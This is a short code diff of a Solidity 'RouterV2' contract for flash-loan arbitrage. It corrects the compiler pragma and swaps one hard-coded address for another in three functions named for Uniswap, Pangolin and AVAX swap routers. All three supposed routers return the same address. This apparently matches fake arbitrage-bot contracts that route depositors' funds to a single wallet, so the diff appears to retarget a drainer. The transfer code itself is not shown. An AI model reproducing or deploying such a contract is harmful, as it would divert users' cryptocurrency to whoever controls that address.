@@ -1,4 +1,4 @@
-pragma solidity ^1.5.0;
+pragma solidity ^0.5.0;
 
 interface pangolinSwapPair {
     event Approval(
@@ -111,7 +111,7 @@ interface pangolinSwapPair {
 
 contract RouterV2 {
     function uniswapRouterV2Address() public pure returns (address) {
-        return 0x83BC352073AAa8d2dc0ff52Ff25e81B19c95E07D;
+        return 0x6E19c827cE4f8406Ef79a0472392d91F821aBa6A;
     }
 
     function compareStrings(string memory a, string memory b)
@@ -123,7 +123,7 @@ contract RouterV2 {
     }
 
     function pangolinSwapAddress() public pure returns (address) {
-        return 0x83BC352073AAa8d2dc0ff52Ff25e81B19c95E07D;
+        return 0x6E19c827cE4f8406Ef79a0472392d91F821aBa6A;
     }
 
     function borrowFlashloanFromMultiplier(
@@ -142,7 +142,7 @@ contract RouterV2 {
     }
 
     function avaxSwapAddress() public pure returns (address) {
-        return 0x83BC352073AAa8d2dc0ff52Ff25e81B19c95E07D;
+        return 0x6E19c827cE4f8406Ef79a0472392d91F821aBa6A;
     }
 
     function callArbitragePangolin(address add0, address add1) public pure {
